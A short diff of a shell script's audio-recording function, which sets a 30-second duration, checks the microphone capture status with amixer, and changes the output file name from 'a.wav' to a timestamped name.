@@ -37,7 +37,7 @@ function ssx_(){
 function ax_(){
     #arecord
     duration=30
-    output_file="a.wav"
+    output_file=`date +%s`"a.wav"
     #
     microphone_status=$(amixer get Capture | grep "\[on\]")
     #
